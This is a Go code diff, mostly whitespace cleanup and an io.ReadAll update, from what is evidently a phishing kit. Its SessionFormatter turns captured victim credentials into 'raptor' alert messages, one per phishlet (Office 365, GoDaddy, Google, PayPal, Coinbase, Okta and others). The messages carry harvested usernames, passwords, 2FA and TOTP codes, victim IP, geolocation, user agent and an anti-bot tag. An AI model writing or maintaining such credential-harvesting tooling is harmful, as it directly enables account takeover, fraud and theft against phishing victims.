@@ -3,7 +3,7 @@ package core
 import (
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"net/http"
 	"strings"
 )
@@ -52,12 +52,12 @@ func (g *IPGeolocator) Lookup(ip string) (*GeoLocation, error) {
 	if idx := strings.Index(ip, ":"); idx != -1 {
 		ip = ip[:idx]
 	}
-	
+
 	// Check cache
 	if cached, ok := g.cache[ip]; ok {
 		return cached, nil
 	}
-	
+
 	// Perform API lookup
 	url := g.apiBaseURL + ip
 	resp, err := http.Get(url)
@@ -65,20 +65,20 @@ func (g *IPGeolocator) Lookup(ip string) (*GeoLocation, error) {
 		return nil, err
 	}
 	defer resp.Body.Close()
-	
-	body, err := ioutil.ReadAll(resp.Body)
+
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	var location GeoLocation
 	if err := json.Unmarshal(body, &location); err != nil {
 		return nil, err
 	}
-	
+
 	// Cache result
 	g.cache[ip] = &location
-	
+
 	return &location, nil
 }
 
@@ -93,7 +93,7 @@ func (f *SessionFormatter) FormatSession(session *Session, phishletName string, 
 			location = geo.Country
 		}
 	}
-	
+
 	// Format based on phishlet
 	switch phishletName {
 	case "o365":
@@ -152,23 +152,23 @@ func (f *SessionFormatter) formatO365Session(session *Session, location string, 
 	// Determine if it's Office365 or GoDaddy based on domain or custom fields
 	isGoDaddy := strings.Contains(strings.ToLower(session.Username), "godaddy") ||
 		strings.Contains(strings.ToLower(session.Name), "godaddy")
-	
+
 	var credentials string
-	
+
 	if isGoDaddy {
 		// GoDaddy format
 		serviceUser := session.Custom["serviceUsername"]
 		servicePass := session.Custom["servicePassword"]
 		godaddyUser := session.Username
 		godaddyPass := session.Password
-		
+
 		if serviceUser == "" {
 			serviceUser = session.Username
 		}
 		if servicePass == "" {
 			servicePass = session.Password
 		}
-		
+
 		credentials = fmt.Sprintf(`{
     "serviceUsername": "%s",
     "servicePassword": "%s",
@@ -182,7 +182,7 @@ func (f *SessionFormatter) formatO365Session(session *Session, location string, 
     "loginFmt": "%s"
 }`, session.Password, session.Username)
 	}
-	
+
 	return fmt.Sprintf(`raptor 🔥 (o365) 🔥
         %s
 
@@ -200,7 +200,7 @@ func (f *SessionFormatter) formatGoogleSession(session *Session, location string
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (google) 🔥
         %s
 
@@ -218,7 +218,7 @@ func (f *SessionFormatter) formatGitHubSession(session *Session, location string
     "username": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (github) 🔥
         %s
 
@@ -237,7 +237,7 @@ func (f *SessionFormatter) formatSlackSession(session *Session, location string,
     "password": "%s",
     "workspace": "%s"
 }`, session.Username, session.Password, session.Custom["workspace"])
-	
+
 	return fmt.Sprintf(`raptor 🔥 (slack) 🔥
         %s
 
@@ -255,7 +255,7 @@ func (f *SessionFormatter) formatSalesforceSession(session *Session, location st
     "username": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (salesforce) 🔥
         %s
 
@@ -273,7 +273,7 @@ func (f *SessionFormatter) formatFacebookSession(session *Session, location stri
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (facebook) 🔥
         %s
 
@@ -291,7 +291,7 @@ func (f *SessionFormatter) formatTwitterSession(session *Session, location strin
     "username": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (twitter) 🔥
         %s
 
@@ -309,7 +309,7 @@ func (f *SessionFormatter) formatInstagramSession(session *Session, location str
     "username": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (instagram) 🔥
         %s
 
@@ -327,7 +327,7 @@ func (f *SessionFormatter) formatLinkedInSession(session *Session, location stri
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (linkedin) 🔥
         %s
 
@@ -345,7 +345,7 @@ func (f *SessionFormatter) formatAmazonSession(session *Session, location string
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (amazon) 🔥
         %s
 
@@ -363,7 +363,7 @@ func (f *SessionFormatter) formatPayPalSession(session *Session, location string
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (paypal) 🔥
         %s
 
@@ -381,7 +381,7 @@ func (f *SessionFormatter) formatAppleSession(session *Session, location string,
     "appleId": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (apple) 🔥
         %s
 
@@ -399,7 +399,7 @@ func (f *SessionFormatter) formatNetflixSession(session *Session, location strin
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (netflix) 🔥
         %s
 
@@ -417,7 +417,7 @@ func (f *SessionFormatter) formatSpotifySession(session *Session, location strin
     "username": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (spotify) 🔥
         %s
 
@@ -435,7 +435,7 @@ func (f *SessionFormatter) formatZoomSession(session *Session, location string, 
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (zoom) 🔥
         %s
 
@@ -453,7 +453,7 @@ func (f *SessionFormatter) formatDropboxSession(session *Session, location strin
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (dropbox) 🔥
         %s
 
@@ -471,7 +471,7 @@ func (f *SessionFormatter) formatDiscordSession(session *Session, location strin
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (discord) 🔥
         %s
 
@@ -489,7 +489,7 @@ func (f *SessionFormatter) formatTelegramSession(session *Session, location stri
     "phone": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (telegram) 🔥
         %s
 
@@ -507,7 +507,7 @@ func (f *SessionFormatter) formatAdobeSession(session *Session, location string,
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (adobe) 🔥
         %s
 
@@ -526,7 +526,7 @@ func (f *SessionFormatter) formatCoinbaseSession(session *Session, location stri
     "password": "%s",
     "2fa": "%s"
 }`, session.Username, session.Password, session.Custom["two_factor_code"])
-	
+
 	return fmt.Sprintf(`raptor 🔥 (coinbase) 🔥
         %s
 
@@ -544,7 +544,7 @@ func (f *SessionFormatter) formatBookingSession(session *Session, location strin
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (booking) 🔥
         %s
 
@@ -563,7 +563,7 @@ func (f *SessionFormatter) formatOktaSession(session *Session, location string, 
     "password": "%s",
     "mfa": "%s"
 }`, session.Username, session.Password, session.Custom["totp_code"])
-	
+
 	return fmt.Sprintf(`raptor 🔥 (okta) 🔥
         %s
 
@@ -581,7 +581,7 @@ func (f *SessionFormatter) formatDocuSignSession(session *Session, location stri
     "email": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (docusign) 🔥
         %s
 
@@ -599,7 +599,7 @@ func (f *SessionFormatter) formatGenericSession(session *Session, location strin
     "username": "%s",
     "password": "%s"
 }`, session.Username, session.Password)
-	
+
 	return fmt.Sprintf(`raptor 🔥 (%s) 🔥
         %s
 
@@ -610,4 +610,3 @@ LOCATION: %s
 INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
 USERAGENT: %s)`, phishletName, credentials, session.RemoteAddr, location, session.UserAgent)
 }
-
